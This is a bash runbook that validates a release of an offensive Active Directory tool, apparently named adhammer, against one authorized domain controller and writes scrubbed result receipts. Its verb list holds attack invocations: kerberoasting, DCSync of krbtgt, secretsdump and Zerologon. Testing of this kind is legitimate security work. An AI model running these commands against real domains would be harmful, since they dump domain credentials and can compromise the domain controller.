#!/usr/bin/env bash
# ADhammer live-validation runbook — Phase 4 of the 1.4.9 100/100 plan.
#
# What it does: runs a defined set of adhammer verbs against ONE
# authorized DC, captures stdout/stderr to a temp file, feeds the
# temp file through scripts/scrub_receipt.py to strip every lab-
# identifying value (IP, SID, password, DC hostname), then writes the
# sanitized receipt to docs/receipts/<version>__<windows_label>.md.
#
# The receipt is committable — no lab identifiers leak. The workflow
# produces both a machine-readable JSON summary and a human-readable
# Markdown block per verb.
#
# What it does NOT do: destructive verbs (dcshadow --push, abuse writes,
# poison / relay listeners, coerce senders). Those are the operator's
# call, from an interactive session. This runbook only exercises the
# supported-tier read + validated-attack paths.
#
# Usage:
#     ADH_DC=192.168.10.20            # DC IP (never committed to receipts)
#     ADH_REALM=CORP.LOCAL             # AD realm
#     ADH_ADMIN='CORP\Administrator'   # admin identity
#     ADH_PW='env:ADH_PW_VALUE'        # password via env indirection
#     export ADH_PW_VALUE='...'        # the actual value; never appears
#                                      # anywhere but this env var
#     WINDOWS_LABEL=2019               # release-cycle label for the receipt
#     ./scripts/live_validation.sh
#
# Output: docs/receipts/1.4.9__2019.md  (readable), .json (machine).
#
# Requirements: bash, adhammer binary built (./target/release/adhammer),
# python3 for the scrubber, sha256sum.

set -euo pipefail

# ---- Sanity ----
: "${ADH_DC:?set ADH_DC to the target DC IP}"
: "${ADH_REALM:?set ADH_REALM to the AD realm (e.g. CORP.LOCAL)}"
: "${ADH_ADMIN:?set ADH_ADMIN to DOMAIN\\User}"
: "${ADH_PW:?set ADH_PW=env:VAR + export VAR — never inline}"
: "${WINDOWS_LABEL:?set WINDOWS_LABEL to the DC OS tag (2019|2022|2025)}"

ROOT=$(git rev-parse --show-toplevel)
cd "$ROOT"

ADHAMMER=${ADHAMMER:-"./target/release/adhammer"}
if [ ! -x "$ADHAMMER" ]; then
    echo "[!] $ADHAMMER not found — run: cargo build --release --bin adhammer"
    exit 2
fi

VERSION=$(grep '^version' Cargo.toml | head -1 | sed 's/.*"\(.*\)"/\1/')
RECEIPTS_DIR="$ROOT/docs/receipts"
mkdir -p "$RECEIPTS_DIR"

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
RAW="$WORK/raw.jsonl"
MD_OUT="$RECEIPTS_DIR/${VERSION}__${WINDOWS_LABEL}.md"
JSON_OUT="$RECEIPTS_DIR/${VERSION}__${WINDOWS_LABEL}.json"

echo "[+] adhammer $VERSION  → live-validation vs Windows $WINDOWS_LABEL"
echo "[+] raw output collected in $RAW (scrubbed before commit)"
echo "[+] receipt will be written to $(basename "$MD_OUT") + .json"
echo

# ---- Define the verbs to run ----
# Each entry: name|args
# args must reference ADH_DC / ADH_REALM / ADH_ADMIN / ADH_PW via ${...}
# so the scrubber can substitute placeholders after run.
VERBS=(
    "scan|scan --url ldaps://${ADH_DC}:636 --user ${ADH_ADMIN} --password ${ADH_PW} --insecure --json"
    "enum_samr|enum samr --host ${ADH_DC} --domain ${ADH_REALM%%.*} --user ${ADH_ADMIN##*\\\\} --password ${ADH_PW}"
    "enum_lsa|enum lsa --host ${ADH_DC} --domain ${ADH_REALM%%.*} --user ${ADH_ADMIN##*\\\\} --password ${ADH_PW}"
    "enum_krb_users|enum krb-users --realm ${ADH_REALM} --kdc ${ADH_DC} --user ${ADH_ADMIN##*\\\\}"
    "enum_posture|enum posture --host ${ADH_DC} --domain ${ADH_REALM%%.*} --user ${ADH_ADMIN##*\\\\} --password ${ADH_PW}"
    "enum_adcs|enum adcs --url ldaps://${ADH_DC}:636 --user ${ADH_ADMIN} --password ${ADH_PW} --insecure"
    "attack_roast|attack roast --url ldaps://${ADH_DC}:636 --user ${ADH_ADMIN} --password ${ADH_PW} --insecure --kdc ${ADH_DC}"
    "attack_dcsync_krbtgt|attack dcsync --host ${ADH_DC} --domain ${ADH_REALM%%.*} --user ${ADH_ADMIN##*\\\\} --password ${ADH_PW} --target krbtgt"
    "attack_secretsdump|attack secretsdump --host ${ADH_DC} --domain ${ADH_REALM%%.*} --user ${ADH_ADMIN##*\\\\} --password ${ADH_PW}"
    "attack_zerologon|attack zerologon --host ${ADH_DC} --domain ${ADH_REALM%%.*}"
)

# ---- Run each verb, capture ----
: > "$RAW"
declare -a RESULTS=()

for verb_spec in "${VERBS[@]}"; do
    name=${verb_spec%%|*}
    args=${verb_spec#*|}
    echo "[>] $name"
    START=$(date +%s)
    if timeout 120 $ADHAMMER $args > "$WORK/${name}.out" 2>&1; then
        STATUS="pass"
    else
        rc=$?
        if [ $rc -eq 124 ]; then STATUS="timeout"; else STATUS="fail (rc=$rc)"; fi
    fi
    ELAPSED=$(( $(date +%s) - START ))
    # Redact secrets THEN append.
    python3 scripts/scrub_receipt.py "$WORK/${name}.out" \
        --dc "$ADH_DC" --realm "$ADH_REALM" --admin "$ADH_ADMIN" \
        --pw "${ADH_PW_VALUE:-}" \
        > "$WORK/${name}.scrubbed"
    echo "{\"verb\":\"$name\",\"status\":\"$STATUS\",\"elapsed_s\":$ELAPSED,\"receipt_lines\":$(wc -l < "$WORK/${name}.scrubbed")}" >> "$RAW"
    RESULTS+=("$name|$STATUS|$ELAPSED")
done

# ---- Assemble Markdown receipt ----
{
    echo "# Live-validation receipt — adhammer ${VERSION} vs Windows ${WINDOWS_LABEL}"
    echo
    echo "Run date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
    echo "Binary sha256: $(sha256sum "$ADHAMMER" | awk '{print $1}')"
    echo
    echo "**Ledger promotion:** every 'pass' row below is eligible to move the"
    echo "corresponding docs/VALIDATION.md row from 'validation owed' to"
    echo "'supported' if it isn't already. Verify manually + commit the ledger"
    echo "change alongside this receipt."
    echo
    echo "All lab identifiers (DC IP, realm, admin cred, SIDs) redacted to"
    echo "placeholders by scripts/scrub_receipt.py before writing this file."
    echo
    echo "## Summary"
    echo
    echo "| Verb | Status | Elapsed |"
    echo "|---|---|---|"
    for r in "${RESULTS[@]}"; do
        IFS='|' read -r name status elapsed <<<"$r"
        echo "| \`$name\` | $status | ${elapsed}s |"
    done
    echo
    echo "## Per-verb output"
    echo
    for r in "${RESULTS[@]}"; do
        IFS='|' read -r name status elapsed <<<"$r"
        echo "### $name — $status"
        echo
        echo '```'
        head -80 "$WORK/${name}.scrubbed"
        echo '```'
        echo
    done
} > "$MD_OUT"

# ---- JSON summary ----
python3 -c "
import json, os
rows = []
for r in [$(printf '"%s",' "${RESULTS[@]}" | sed 's/,$//')]:
    name, status, elapsed = r.split('|')
    rows.append({'verb': name, 'status': status, 'elapsed_s': int(elapsed)})
out = {
    'version': '$VERSION',
    'windows_label': '$WINDOWS_LABEL',
    'binary_sha256': open('$MD_OUT').read().split('sha256: ')[1].split('\n')[0],
    'verbs': rows,
}
print(json.dumps(out, indent=2))
" > "$JSON_OUT"

echo
echo "[+] Wrote $MD_OUT + $JSON_OUT"
echo "[+] Review with:  git diff docs/receipts/"
echo "[+] Commit with:  git add docs/receipts/ && git commit -m 'validation: adhammer $VERSION receipt vs $WINDOWS_LABEL'"
